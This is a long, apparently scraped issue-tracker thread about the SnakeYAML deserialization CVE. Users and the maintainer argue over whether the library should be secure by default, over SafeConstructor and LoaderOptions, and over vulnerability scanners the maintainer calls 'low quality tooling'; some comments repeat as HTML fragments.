3. It is a good practice to write code once. I do not get your statement that you have to “centralize all YAML operations“. You should do regardless of anything - please keep doing it in the future
4. You know now that YAML \(which only comes from untrusted source, which is never the case!\) may contain tags and unmarshal custom Java instances. You have enough means to prevent it. Your issue is solved.

Real projects do not have any issue. It is only to satisfy low quality tooling \(finally everyone agrees that the tools have low quality because they are unable to do the job **properly**\)

_N.B. Just for your information. The LoaderOptions in your YamlOperator class should be stricter if the data really comes from an untrustred source.

In my last reply I provided a link to my project, Jervis. For company-wide CICD solutions it is naive to suggest you should trust all of the users. I have a zero-trust model. Any self service solution should be operating on a zero-trust model to protect users from themselves. Compromised CICD infrastructure is one of the worst compromises a company could have due to its centralized nature and broad access.

&gt; I do not understand why the deprecation of the `new SafeConstructor()`becomes a topic here. It is totally unrelated to this discussion. The code changes - it is natural. It will be changed later as well.

It is related. If `new Yaml()` had a safe implementation as a default I would not have to worry about the details of `SafeConstructor`. `new Yaml()` would handle the details of not using any deprecated constructors.

&gt; It is a good practice to write code once. I do not get your statement that you have to “centralize all YAML operations“. You should do regardless of anything - please keep doing it in the future

My project has 0% code duplication for its maintainability reported by SonarQube. Relying on a library helps with that. It makes less sense if the entire library \(SnakeYAML\) must be contained to one class for an entire project.

&gt; You know now that YAML \(which only comes from untrusted source, which is never the case!\) may contain tags and unmarshal custom Java instances. You have enough means to prevent it. Your issue is solved.

Plenty of YAML comes from an untrusted source and I gave my case for it. It is abnormal for a library handling a data format \(yaml/json/xml/whatever\) to do unmarshal by default without extra setup or options.

I should not have to know this when a library gives its recommended usage.

&gt; _N.B. Just for your information. The LoaderOptions in your YamlOperator class should be stricter if the data really comes from an untrustred source. SnakeYAML has means to restrict recursive keys, numbers of aliases for collections and the data size. Use it since you should know how your expected data must look like._

Can you please elaborate?  The YAML truly comes from untrusted sources and I need the library to not be a source of compromise for the hosted service.  How would I change `LoaderOptions` to be more secure?  I’ve seen others use `LoaderOptions` this way so they probably do not know, either.

Please adopt a secure by default approach for basic instantiation."

I should probably create wiki with explanation what to add to LoaderOptions to make it more robust. You can check the Javadoc, it should provide more information.  
By the way, the extra properties will NOT be activated by default, because they depend on the context.

    <p>Well, your use case has nothing to do with the issue. The data only comes from trusted sources. Your users must be authenticated.</p>
<p>I should probably create wiki with explanation what to add to LoaderOptions to make it more robust. You can check the Javadoc, it should provide more information.<br>
By the way, the extra properties will NOT be activated by default, because they depend on the context.</p>

&gt; Your abrasive attitude and lack of willingness to work with the multitude of incredibly smart people in this thread that are offering explanations, use case scenarios, and immensely helpful suggestions, is unprofessional and uncharacteristic of open source development collaboration.

This is unacceptable, I will skip it once

&gt; Your anger and frustrations with vulnerability tools is misdirected towards everyone here and frankly I am saddened to see it

Well, my anger with the low quality tooling should help others to understand the context. I do my best to explain. If you really read all the posts, you should see the amount of confusion. \(Like they say that a whitelist will be controlled by devops and not developers. :thinking: \)

All the reported use cases are about parsing internal configuration. This is NOT a problem. Please read the CVE. It is ONLY a problem for the low quality tooling.

Why should the Open Source community suffer from the false positives of the low quality tooling ?

&gt; Please understand that many of us just want to help get this resolved \(properly, and not with a band-aid fix like a black list\) as quickly as possible.

What stops you ? You can fix your project and continue.

I am afraid you expect something else - you want to shut the low quality tooling up because they report a false positive.

All I want is developers to come to the origin of the problem and **help** their low quality tooling to radically improve the quality of the reports \(especially when the low quality tooling is asking money to produce the low quality reports\)

By the way, your message sounds like a demand. I hope it is not the case. Otherwise please send me a link to your Open Source project which you maintain in your free time over 10 years to see if you can demand."

I had a call with Andrey last week which was very pleasant and I learned quite a bit from.

‌

You’ll have to excuse that it's taken this long for me to respond on this thread, I was on vacation last week and now have a cold unfortunately.

‌

During our call, Andrey asked me to reiterate a point, which I do agree with: there is no security risk if you are not processing untrusted user input. This statement is true. That being said, there are many applications that do parse untrusted YAML so it would be good to ensure this library is secure by default.

‌

To that end, I proposed that the change we make is to modify SnakeYaml so it doesn't process class names in, what in the YAML spec are called “global tags”. By not reading class names and attempting to instantiate classes from these global tags, at least not by default, I believe will remove vulnerability from SnakeYaml allowing it to safely operate on untrusted data without leading to this remote code execution vulnerability.

‌

&gt; Your abrasive attitude and lack of willingness to work with the multitude of incredibly smart people in this thread that are offering explanations, use case scenarios, and immensely helpful suggestions, is unprofessional and uncharacteristic of open source development collaboration.

Spencer, please keep in mind the saying “Open Source is ‘free’ as in ‘free puppy’“. Andrey doesn't owe us anything, nor do we have a right to direct him to do anything with this project he doesn't want to. That being said, the purpose of this thread is to try to come to a common understanding.

‌

I believe, prior to my call with Andrey, the ask I, as a security professional, was making, was unclear and scoped too broadly. During my conversation with Andrey we were able to come up with a narrowly scoped fix to adequately protect end users.

‌

It’s my plan to open an issue with the proposal to disable global YAML tag processing by default after the new year when I'm back at my desk regularly.

[https://yaml.org/spec/1.2.2/](https://yaml.org/spec/1.2.2/)

‌

According to Andrey, most YAML parsers interpret the Global tags to mean “instantiate a class of this type”, as some sort of unwritten contract. Unfortunately, this means this vulnerability exists in quite a few YAML parsers. It's my intention to reach out to other maintainers in other languages to try to get this vulnerability eradicated industry-wide"

<p>According to Andrey, most YAML parsers interpret the Global tags to mean “instantiate a class of this type”, as some sort of unwritten contract. Unfortunately, this means this vulnerability exists in quite a few YAML parsers. It's my intention to reach out to other maintainers in other languages to try to get this vulnerability eradicated industry-wide</p>

&gt; SnakeYAML has been a challenge to work with. I found a while a go my application to be insecure after static analysis tools like SonarQube and dependency analysis tools like DependencyTrack flagged my application as vulnerable. I had to painstakingly go through all of the places I use SnakeYAML and initialize with SafeConstructor.

1. You are not affected and the low quality tooling make a false statement \(because they cannot take your context into account\). 
2. Even after you changed your app to use `SafeConstructor` the low quality tooling is still complaining \(because they do not follow the advice of the CVE\)
3. Even after the suggested fix \(which will not be done\) the low quality tooling will make another false conclusion that your app works properly even though you might configure it to accept any class to be instaniated
4. The low quality tooling fails to create sound reports - why should we trust it ?

The only solution is to go to the low quality tooling and help them to improve the quality. They cannot create false positive based solely on the name and version of the library. Or they have to explain that they are most probably wrong.

They were legitimate reports and not a false positive or low quality.

My application relies on untrusted YAML provided by unknown users.

Are you saying you guarantee there’s no RCE vulnerability for the above usage of SnakeYAML? As far as I can tell, the above code example has a vulnerability and so those reports helped me improve my software.

After I changed my code the security tools stopped reporting a vulnerability in my application.

# Main issue

SnakeYAML by its default constructor is really easy to have an unsafe configuration with untrusted YAML. You ignored my use case and rephrased my words inaccurately.

```
new Yaml()
```

A better usage of your time could be to change SnakeYAML not have possibility of RCE with default Yaml constructor. As opposed to arguing with waves of developers misconfiguring your library with default constructor usage."

it is not me[ it is the CVE](https://nvd.nist.gov/vuln/detail/CVE-2022-1471)

&gt; We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization.

Unfortunately, the low quality tooling does not care. As always.

It is very sad that even after the above explanations from Jonathan you still insist on the wrong solution.

But I fully understand your pain from using the low quality tooling and their inaccurate reports."

If a particular tool doesn’t pick up the CVE edits - then go after the maintainers of the tool.</p>

I am not experienced in snakeyaml and got a bit confused after reading the wiki and this issue ticket. We happen to have snakeyaml as a transit dependency for one of the 3pps we use.

My question is, is it still vulnerable even with SafeConstructor when constructing Yaml\(\)? Or is it good enough if SafeConstructor is used?

Thanks in advance.

Thank you for the quick reply. Sorry I haven’t given any detail about the 3pp.

The referred 3pp is kubernetes-client from fabric8io [https://github.com/fabric8io/kubernetes-client](https://github.com/fabric8io/kubernetes-client). The client talks with kubernetes API server and mainly uses snakeyaml to perform deserialization of yamls in responses from a k8s API server.  
According to the source code, [https://github.com/fabric8io/kubernetes-client/blob/master/kubernetes-client-api/src/main/java/io/fabric8/kubernetes/client/utils/Serialization.java#L256](https://github.com/fabric8io/kubernetes-client/blob/master/kubernetes-client-api/src/main/java/io/fabric8/kubernetes/client/utils/Serialization.java#L256)  
SafeConstructor is used without any additional LoaderOptions.  
I think in our context, the client talks with a trusted server so there is barely anything to worry about.

However, just to be on the safe side and to better understand the impact myself,  
if we indeed use snakeyaml to parse a yaml file from unrested sources, does SafeConstructor would help to mitigate this specific vulnerability? Or is the fix required for mitigation, even when SafeConstructor is used?  
Thanks in advance."

could you please help me? Do I understand well that the usage of SafeConstructor mitigates this issue? Is it possible to deserialize a custom java object in a secure way with the SafeConstructor? In this case do I have to write  a custom resolver for my class? Or what is the best way?

Thanks in advance!"

Perhaps if this question is answered clearly, people will stop asking on case by case basis. It should be answered irrelevant of whether the particular cases mentioned above fall into the vulnerable category or not."

<p>If so, and if it’s not possible to upgrade to safe version of SnakeYAML (which hasn’t been released yet, unless I missed it), what are the steps that should be taken to avoid the vulnerability?</p>
<p>Perhaps if this question is answered clearly, people will stop asking on case by case basis. It should be answered irrelevant of whether the particular cases mentioned above fall into the vulnerable category or not.</p>

         data-content="This has been a long and interesting read. I completely sympathize with the difficulties of frequent reports of CVE’s detected by tooling. With input from others on the project I recently helped rewrite the Solr Security News page, which seems to have helped cut down on the number of inappropriate emails to our security list \(meant for new discoveries to be kept private, not communications regarding public stuff\). One can hope that if something like VEX gains support \([https://github.com/oasis-tcs/csaf/blob/master/csaf\_2.0/prose/csaf-v2-editor-draft.md#45-profile-5-vex](https://github.com/oasis-tcs/csaf/blob/master/csaf_2.0/prose/csaf-v2-editor-draft.md#45-profile-5-vex)\) then the upstream projects won’t have to pass the buck to the downstream dependencies when they haven’t used the dependency in an unsafe manner. Until the folks who wrote the software and have the context to judge the problems reasonably can be given a conduit to express their judgements in machine readable format, we all will have to work a bit harder. 

One thing I see above I don’t agree with is this repeated assertion that one cannot have a vulnerability accepting data from an authenticated/authorized user. This embeds the assumption that every one who ever used YAML understood all the possible features of it and the extension usages common in the industry that exceed the specification \(ref: global tag class loading\). It’s entirely likely that a very reasonable and competent programmer intending to accept configuration changes from a user. Yaml is a very pleasing format for communicating configuration and so it’s likely to get used. The fully authenticated and authorized user supplying the configuration is _supposed to_ be able to change configuration, but they are usually NOT meant to be able to run arbitrary code on the hosting server. The easy to imagine case for this would be a multi-tenant application with end-users, tenant-admins, and super-users. The end-users, just use whatever is configured. Tenant-admins specify per-tenant configuration and are employed by paying customers, but would never be granted access to machines, or other tenants, and super-users are the logins for the company that owns the servers and wrote the software and sells the services. If tenant-admins are allowed to specify the configuration they control in YAML and the developers didn’t understand every last little bit of what could happen in a YAML file, tenant admins might be run code that  gives them visibility into other tenants, or takes down servers impacting other tenants, etc. Imagine the fun if someone at Lowes figures out how to wipe out Home Depot’s data via supplied config…

_**Technically**_ it’s an error by the programmer that decided to accept YAML for user supplied configuration, but it’s also analogous to a roadway with a low bridge that is unmarked. Sure the driver of a 12ft tall truck shouldn’t drive into the 11ft 6in bridge. _**Technically,**_ if there is doubt the driver should get out and measure before going under or at least approach very very slowly…. But people tend to assume safety by default, and occasionally they are in a hurry, so we put up big bright signs and make people ignore chains or poles banging off their truck \(or in the case of software, we force them to enable non-default configurations\) to keep people from hurting themselves, and someone’s grandma who was unlucky enough to be driving under the bridge at the same time. Some people still ignore everything \(or enable the non-default config without understanding why it’s off by default\) but at least we can save some of the bystanders who don’t deserve an entire college dorm of furniture falling on their front windshield, or an hour long wait in traffic on the way to a job interview or the airport… etc… [https://www.wbur.org/news/2021/08/27/college-moving-boston-storrow-drive](https://www.wbur.org/news/2021/08/27/college-moving-boston-storrow-drive)

Another problem that arises over time is that someone assesses the usages at the time the issue is detected and verified to be a “Not a Problem” and then someone adds a new feature that exposes the previously unexposed vulnerability. Then the organization has ignored the detected CVE and has no way to know that they became vulnerable. \(some tools like ForbiddenAPIs might help\). Also, an imported dependency might get used by an intern inadvertently because it was suggested by an IDE. So it’s not entirely unreasonable for large organizations to want libraries to be safe by default. As irritating as all of this is none of us want to see companies go out of business, or people get laid off due to revenue loss after lawsuits, or worse yet end-users have identity or money stolen because of these sorts of things.

Hey, I live in Boston! How could you disparage the anual tradition of some poor out-of-state driver delidding a Uhaul on college move in day \(informally known as “Storrowing”\)! Every Bostonian knows we live for these stories! \(Everything said in this paragraph is sarcasm\)

In all seriousness, Patrick, you make some really good points which I fully agree with.

<p>Some people still ignore everything (or enable the non-default config without understanding why it’s off by default) but at least we can save some of the bystanders who don’t deserve an entire college dorm of furniture falling on their front windshield, or an hour long wait in traffic on the way to a job interview or the airport… etc… <a data-is-external-link="true" href="https://www.wbur.org/news/2021/08/27/college-moving-boston-storrow-drive" rel="nofollow">https://www.wbur.org/news/2021/08/27/college-moving-boston-storrow-drive</a></p>

<p>Hey, I live in Boston! How could you disparage the anual tradition of some poor out-of-state driver delidding a Uhaul on college move in day (informally known as “Storrowing”)! Every Bostonian knows we live for these stories! (Everything said in this paragraph is sarcasm)</p>
<p>In all seriousness, Patrick, you make some really good points which I fully agree with.</p>

How does it help to improve the low quality reports ? The low quality tooling ignores the context anyway. Absolute majority of use cases is either internal configuration provided in the classpath, or machine-to-machine data exchange. In both case it is safe.

If only those who are really affected come here, you would never read this ticket. Those who are really affected can fix it themselves and they do not need any support from SnakeYAML. The new release is not required. The release with a quasi fix is ONLY required to shut the low quality tooling up. 

By the way, the quasi fix is very questionable, because those who may accept YAML from untrusted source may very easily configure to run any global tag and the low quality tooling will NOT warn them.

I find it very important to give the community enough information to go to the tooling and request to improve the quality.

By the way, I see the explicit lie on the issue tracker of one of the low quality tooling about “the maintainers“ of SnakeYAML. It means they read it - I hope they will try to improve."

If you don’t need the functionality of a library, the best strategy to actually handle it’s potential security issues is to not use it at all.

For transitive dependencies, as with spring, you can probably safely exclude it in the dependencies, as long as you use the `application*.properties` format to configure your system, rather than the `application*.yaml` format. For instance with maven and spring-boot:

\`\`\`

```xml
...
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;
    &lt;exclusions&gt;
        &lt;exclusion&gt;
            &lt;groupId&gt;org.yaml&lt;/groupId&gt;
            &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt;
         &lt;/exclusion&gt;
    &lt;/exclusions&gt;
&lt;/dependency&gt;
...
```

‌

That makes the library go away with all its \(potential\) security flaws, and thus shuts up the “low quality tooling” very effectively ;-\).

BTW: keep this strategy in mind for other dependencies, too. It can’t hurt to evaluate from time to time, which dependencies are _really_ needed in a software project."

As a library maintainer, that is completely out of scope for you - you shouldn’t care at all where the input comes from or whether the people who provide it are trustworthy.

You should treat _all_ input as being untrusted and implement reasonable measures to mitigate the risks that follow from that fact. The idea of white listing has already been mentioned among others.

And if that breaks your API, so be it. Bump up the major version and let the library consumers know that they need to migrate \(in the release notes\). It’s then their responsibility to do so.

To clarify that, you _cannot_ treat your input as trusted and push the responsibility of ensuring that to your consumers. Snakeyaml is a public extension which might be used by thousands of developers in as many projects and extensions, as direct and transitive dependency, in systems, services and workflows you might not even imagine. You cannot know all of them. And more importantly, most of them have no influence of how snakeyaml is used. Especially when it comes in as a transitive dependency… I, for instance, didn’t even know that snakeyaml exists, until the “low quality tooling” reported this security issue with it."

         data-content="&gt; The phrase “external party” is rather pointless. The **location** of the party isn’t important at all. It’s whether or not you trust them. “Untrusted parties” are what I described.

I am talking about Untrusted parties. The issue is that your problem will stay regardsless of the provided fix. Why do you demand a change which does not improve anything for you ? \(except the low quality tooliong will shup up\)

&gt; You should treat _all_ input as being untrusted and implement reasonable measures to mitigate the risks that follow from that fact. The idea of white listing has already been mentioned among others.

Wow, all the nessesay measures are there !! Please read the CVE. As I told many times, you do not need any release to fix the issue if it exists for you. The only thing you cannot do - to shup the low quality tooling up.

&gt; I, for instance, didn’t even know that snakeyaml exists, until the “low quality tooling” reported this security issue with it.

Keep having a nice life. If you do not come to you low quality tool, they will bother you forever with false positives \(as they currently do\)"

<p>I am talking about Untrusted parties. The issue is that your problem will stay regardsless of the provided fix. Why do you demand a change which does not improve anything for you ? (except the low quality tooliong will shup up)</p>

<p>You should treat <em>all</em> input as being untrusted and implement reasonable measures to mitigate the risks that follow from that fact. The idea of white listing has already been mentioned among others.</p>

<p>Wow, all the nessesay measures are there !! Please read the CVE. As I told many times, you do not need any release to fix the issue if it exists for you. The only thing you cannot do - to shup the low quality tooling up.</p>

<p>I, for instance, didn’t even know that snakeyaml exists, until the “low quality tooling” reported this security issue with it.</p>

<p>Keep having a nice life. If you do not come to you low quality tool, they will bother you forever with false positives (as they currently do)</p>

&gt; Wow, all the nessesay measures are there !!

Just being there is not enough. You must also ensure that they are actually _used_. This was mentioned as “security by default” in the discussion here above. Library consumers should be able to _opt-out_ of security, not to opt-in.

Because the sad truth is that most people/developers just don’t care. Its human to take the shortest and most convenient path to a solution, not reading documentation or wiki, just follow the most simple tutorial and bring that into production, etc. It happens all the time. When security is not on that path, it gets bypassed. Only later, when the damage is there, they look back and wonder how that could have happened… It's better to force them to their luck in advance.

In my opinion, whenever possible a developer should need to jump through hoops \(make inconvenient method calls, add explicit configuration flags, etc.\) to use a library in a potentially insecure way. Its not good enough for the capability to exist \(to use the library securely\), it should be the default, easiest way to use the library \(without needing to read docs to find it\). And, yes, the assumption should be that untrusted inputs are provided.  The “low quality tooling” is partially correct here – its too easy for the library to be used in an insecure way and so the tool needs to raise an alert for consumers to investigate further.

While Snakeyaml was built to implement a spec and the spec permits insecure usage, how that insecure part of the spec can be implemented matters. I agree with @{63c822febfdb647eb1d9fe26} in that the people are much more likely to use the most straight-forward, cleanest looking code \(without reading docs\) so that code should assume the most secure usage of the library.

I do think that this tooling could improve by recognizing secure use of the library and not alert \(or alert at a lower risk level\) and to be more reasonable about the relative evaluation of the risk of this library compared with others \(e.g. is this really nearly as big a concern as log4shell as the 9.8 rating would indicate?\), but that may be asking too much for tools that are built to support a wide variety of languages which can use libraries in many ways.

I am glad to see that the 2.0 pending version of the library will be more secure by default."

I have been assuming that you view this as “low quality” because they are not considering that the way those dependencies are used could be safe \(and therefore the CVE does not apply to that solution\).  Is that correct or am I misunderstanding what you mean by “low quality tooling”?

If I am correct, then your argument does not apply since those tools do not look at any code at all.  They are judging the dependency not the code using the dependency."

That, in turn, is _your_ interpretation.

&gt; Why the low quality sent you here even though you are explicitly not affected ??? Why the Spring users are affected and they ask for any change ? Why the low quality tooling does not want to improve it ?

We get lots of such reports from those tools about many other libraries on an almost weekly or monthly basis. That’s why I am here, I usually follow up on these reports and look for new versions that fix the issues. And in almost all cases this is done and there is a new version at some time, which obsoletes the CVE. In the very rare cases, when it is not done, the library has usually been abandoned and there is no maintainer. In that case we try to substitute or remove it. 

&gt; The default is only for a very small part of users who really blindly take YAML files \(not a single use case is reported so far\)

Yes, and exactly that is the problem. Not a single use case reported does not mean that there _is_ no use case… it just means that the users have _no problem to report_, because it “works” for them. In that regard, this might be the majority of your library consumers and you just don’t know it.

However, the security breach comes later, when they don’t even remember anymore that it “just worked”.

&gt; Please also be aware that even the other _Consturctor_ is used, it may be **safe** - the developer may choose the policy to create a class.

I understand that. But couldn’t the policy be restrictive by default?

    <blockquote>
<p>They say “<em>We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization.</em>“</p>
</blockquote>
<p>That, in turn, is <em>your</em> interpretation.</p>
<blockquote>
<p>Why the low quality sent you here even though you are explicitly not affected ??? Why the Spring users are affected and they ask for any change ? Why the low quality tooling does not want to improve it ?</p>
</blockquote>
<p>We get lots of such reports from those tools about many other libraries on an almost weekly or monthly basis. That’s why I am here, I usually follow up on these reports and look for new versions that fix the issues. And in almost all cases this is done and there is a new version at some time, which obsoletes the CVE. In the very rare cases, when it is not done, the library has usually been abandoned and there is no maintainer. In that case we try to substitute or remove it. </p>
<blockquote>
<p>The default is only for a very small part of users who really blindly take YAML files (not a single use case is reported so far)</p>
</blockquote>
<p>Yes, and exactly that is the problem. Not a single use case reported does not mean that there <em>is</em> no use case… it just means that the users have <em>no problem to report</em>, because it “works” for them. In that regard, this might be the majority of your library consumers and you just don’t know it.</p>
<p>However, the security breach comes later, when they don’t even remember anymore that it “just worked”.</p>
<blockquote>
<p>Please also be aware that even the other <em>Consturctor</em> is used, it may be <strong>safe</strong> - the developer may choose the policy to create a class.</p>
</blockquote>
<p>I understand that. But couldn’t the policy be restrictive by default?</p>

Dependency reviewing applications \(like Mend\) do not review code and just review dependencies for potential use of libraries with concerns \(security or licensing\).  SCSA applications \(like Fortify, SonarQube\) scan code for security and quality.  I agree with @{63c822febfdb647eb1d9fe26} in that it is inaccurate to call the first class of applications “low quality” because they do not conduct scans like the second – they serve different purposes.

I think you have a valid argument to make against the application of the CVE to snakeyaml because the library provides a secure way of interpreting YAML files.  So, following that argument, they should test every consumer of snakeyaml and raise a CVE on those that are able to load unexpected classes by not using that secure code \(and the second class of tools, e.g. Fortify, would catch those that use the library directly\).  I think we can all agree that this would consume a tremendous number of resources to perform the testing, make the changes where needed, and verify the changes.

In all other cases that I have read where this argument is made, the conclusion has been that the underlying library should make the secure path the default and make a developer need to take extra steps to use the library in a potentially insecure way.  This is clearly the most effective way of closing this concern for nearly all uses of the library, which should be the goal of everyone involved \(and especially the library authors – snakeyaml and consuming libraries\)."

That being said, you did not address my comment about efficiently addressing the potential vulnerability \(which is the primary goal of all of us\).  You can see here that snakeyaml is used in over 3600 known libraries \([https://mvnrepository.com/artifact/org.yaml/snakeyaml/usages](https://mvnrepository.com/artifact/org.yaml/snakeyaml/usages)\).  Wouldn’t it make more sense to update the default way of constructing snakeyaml \(Constructor class\) to make it secure by default instead of asking the maintainers of all those libraries to make the changes or verify their use?  The few consumers that need the ability to deserialize unexpected types can make the change to use something like UnsafeConstructor.

The risk of having this vulnerability exploited is much higher if we depend on the maintainers of all those libraries to make a change vs snakeyaml making a change, right?"

CVE is correct - it provides the exact information. This is what it is supposed to do.  
You do not answer my question - if the app is using Spring to parse internal configuration, do you consider this as a safe usage ? \(and false positive from the low quality tooling\) 

According to the CVE it is safe, according to the security researcher it is safe. What is your answer ?

&gt; The risk of having this vulnerability exploited is much higher if we depend on the maintainers of all those libraries to make a change vs snakeyaml making a change, right?

Of course NOT right. \(Please first answer the above part.\)"

         data-content="@{557058:26b2b144-0865-42ea-ab97-e718812c8217} You keep talking about “low quality tooling” as if using it is a choice.  However, as far as I know, there is no “high quality tooling” that can accurately determine whether a given library is being used in a safe manner or not. Apps are way too complex for static analysis to determine this accurately.  The only alternative is to do “defense in depth” \+ “secure by default”.  

As maintainers of mission critical apps, we simply dont have a choice, because even if I am able to review how every libraries uses every every other library today, it is not feasible to do that correctly every time any library is updated.

 To give you some analogies:

Defense in depth:  if you had some diamonds, you would want defend them in multiple layers. You wouldn't just try to secure the doors and windows in your house, and then leave them sitting on your dining room table. You would also put them into a safe.

Secure by default: when you sell medicine, you put them into a child-proof container, so that it’s secure by default. Putting a label on it “Dont allow your babies to eat this” is not enough, because mistakes happen.  Yes, it would be ideal if every parent was able to provide perfect oversight for their child, but it is not realistic to expect that.  Moreover, even if the probability of this happening is low, the impact is very significant.

Your claims about low quality tooling remind me of this old soviet joke: “A soviet bureaucrat is giving an interview and says ‘I invented a plane that will have 1000 seats!’. The journalist asks him ‘But how will it fly if it’s so large?' The bureaucrat replies “ah, the engineers will need to figure it out”.

Perhaps, I am wrong and “high quality tooling” exists.  Could you please share it?  
Otherwise, could you please explain what is the harm of making SnakeYAML secure by default?"

I do my best to let the industry aware of the awful situation and the necessity to find a solution. Check all the other false positives which the tooling creates all time - do you expect forever waste you time for nothing ?

I do not see a problem to release quasi“secure by default“. It was already implemented.

Important: I assume that you are not affected at all, but you also waste your \(and my\) time for nothing

None of us know where to find such tooling either. Just demanding it probably won’t make it appear. I personally suspect the prospect of creating such tooling requires a highly general AI\*\*  which is thus far intractable \(or not yet pubicized by whomever has invented it\). If you can think of a tractable solution, please write it and probably a lot of us will pay you money for it. Then you can probably buy yourself a yacht :slight_smile: \(or a bigger yacht?\).  Since it’s an unsolved problem, other workarounds are needed. Key strategies that I, and I suspect others, would find heart warming include:

1. Ensuring that documentation, especially the simplest first example \([https://bitbucket.org/snakeyaml/snakeyaml/wiki/Documentation#markdown-header-loading-yaml](https://bitbucket.org/snakeyaml/snakeyaml/wiki/Documentation#markdown-header-loading-yaml)\) is an example that provides maximal safety. \(Reading this code:[https://bitbucket.org/snakeyaml/snakeyaml/src/41adee630fb3d99fa4d232dab7202366d03a8bbf/src/main/java/org/yaml/snakeyaml/Yaml.java#lines-64](https://bitbucket.org/snakeyaml/snakeyaml/src/41adee630fb3d99fa4d232dab7202366d03a8bbf/src/main/java/org/yaml/snakeyaml/Yaml.java#lines-64) makes shows that the most basic example does not use the SafeConstructor\(\) class mentioned above\)
2. Document the significance/tradeoffs/difference between using new Yaml\(\) which internally does `new Constructor(new LoaderOptions())` which now has a `UnTrustedTagInspector()` by default in the LoaderOptions object versus using `SafeConstructor()`. I fear there is some risk you are taking flack because your documentation is unclear, rather than your software unsafe.
3. Class Javadoc that outlines the risks \(none of `Yaml`, `Constructor` or `SafeConstructor` mention any safety issues in doc comments for either the class or the constructor. In the case of `SafeConstructor` it would be great if it documented what it is keeping the user safe from\)
4. Perhaps more controversially, shifting the implementation of the default `Yaml()` such that it uses `SafeConstructor()` UNLESS you pass an argument telling it to use a more permissive loading scheme, along with clear documentation identifying the risks associated with the more permissive scheme. 

Certainly SnakeYaml should continue to provide it’s valuable features, but in today’s world \(the period **between** increasing security awareness and monitoring and the subsequent invention of high quality tooling\), there is an increasing demand for security to be prioritized over convenience.

Also note that the docs link to a broken link for a safe constructor example: [https://bitbucket.org/snakeyaml/snakeyaml/src/tip/src/test/java/examples/SafeConstructorExampleTest.java](https://bitbucket.org/snakeyaml/snakeyaml/src/tip/src/test/java/examples/SafeConstructorExampleTest.java)

‌

\*\*  General AI is probably required because the source of the incoming .yaml file is potentially only described in requirements or documentation, and may not be evident from the code itself and also needs to be traced through N levels of libraries in between. In a case I have \(also not using spring\) there are ways in which command line arguments might get written into a config .yaml that configures a dependency \(an embedded Cassandra instance\). The value will be used upon subsequent restart. That means anyone starting the program for the first time, can add content to the yaml that gets processed on every startup. In my case, not very risky and it is entirely tractable to mitigate with input validation. None the less, it is a small window that in other situations would possibly be problematic.

&gt; The worst thing to do is to trust this tooling.

If trusting dependency analysis is the ONLY thing that a company does to secure its application then I would agree with you. But most of the companies that are paying attention to dependency analyzers ARE practicing defense-in-depth. They are also using pen tests, vulnerability scanners and signal analysis.  Just like you would not leave your safe with diamonds in your back yard.

&gt; To follow you analogy: Let us sell medicine, fruit, bread, sweets, stones, pencils etc ALL in a child-proof container.

This is an example of [all or nothing logical fallacy](https://www.logicallyfallacious.com/logicalfallacies/False-Dilemma).  Who said anything about fruit, etc?  It is not true that you should not make the library secure by default \(or put medicine into child proof containers\) just because it will not fix 100% of all cases.

&gt; I do my best to let the industry aware of the awful situation and the necessity to find a solution.

“Low quality tooling” is the current state of the art - we don't have an alternative.  The current situation is not perfect, but 1\) it is better then nothing; 2\) you are not going to convince the management of hundreds of companies that they should do nothing because Andrew Somov doesnt think the current state of the art is not good enough.  So the net effect is that you are just making life difficult for a lot of people, but since **you are not proposing the alternative, nothing will change.**   

Do you think that if I go to my CISO and complain that i cant use SnakeYML, they will change the policy? Do you think that our CEO will say “You know what, we should start a company that will find a solution to this technical problem”? I dont think so :\) if anything, they will require that every version of every library has to be “approved” by the security team.

1. the low quality tooling gets finally the proper name and recognition
2. the technicians understand that they should not trust the low quality tooling - it can only be used as a hint for investigation
3. technicians help the security/management to accept that the tooling is not worth to pay the money until they radically improve
4. low quality tooling will slowly \(with the help of community, including myself\) evolve and become high quality tooling
5. people from the low quality tooling will hear my voice and they decide that they want to grow professionally \(otherwise no one will pay the bill\) - I am sorry, they do not have this excuse _“Low quality tooling” is the current state of the art - we don't have an alternative.“_

         data-content="&gt; The discussion will be closed immediately when SnakeYAML with secure by default is released and CVE is updated to indicate which version implements it.

1. My disappointment with CVE will grow - because the new version does not remove the vulnerability, it will hide it. If they simply remove it, it would mean that they will cause false negative \(when the vulnerability exists but not detected\). The good point is that false negatives are used by attackers, but they do not cause any issue in my issue tracker :laughing: 
2. I assume you are not affected at all, because if you are you could have solved it already \(if you not need a release for that\). You use SnakeYAML as transitive dependency.  It means that the library which does use SnakeYAML has to be changed \(The version 2.0 is not backwards compatible.\). You cannot simply provide another version of SnakerYAML at runtime, it may or may not work. I already prepared a PR for Spring, but I am waiting.

&gt; since you do not respect my time simply reading **this topic**, I see no point for further discussion with you.

I am following this thread since mid December, shortly after the issue was created and long before I jumped into the discussion myself. I have read _every_ post here and still do so. So it’s simply wrong to blame me that I don't read the topic.

The only message I get from your posts here is, that you are stubbornly continue to insist on your complaining about the “low quality tooling”. Meanwhile others have added good points, so I can just follow up.

What you demand is in the end, that a tool exists which scans the source code and detects insecure patterns \(such as SQL injection, buffer overruns, XSS vulnerabilities and so on\), _and_ the insecure usage of any library that was included. This challenge can safely be classified as NP-hard, in other words, not solvable. Unless someone shows up and solves the millennium puzzle to prove that P=NP. Until then, only specific parts of the problem can be solved at all, maybe quite a few of them by optimization techniques like AI.

For a specific solution, someone could implement a particular rule for a particular static code analysis tool, which scans the code for usages of the unsafe snakeyaml constructor \(or other particular things\). This rule would then apply to snakeyaml only, in a specific version only, and could be used only in a specific code analysis tool. Users of other versions of snakeyaml or other tools are out. So all consumers of your library must use that specific tool, and furthermore they must make sure that the rule is installed, set to a meaningful severity and its reports are not ignored… all possible breaking points. And a huge effort for such a small library.

If an AI would be developed for the problem, the quality of this would depend solely on the training sets. Over time it _could_ be helpful, but it would definitely take time. Not to forget that an AI, if it exists, could \(and would\) also be used on the dark side. So we have the same cat and mouse game as today, just on a different level.

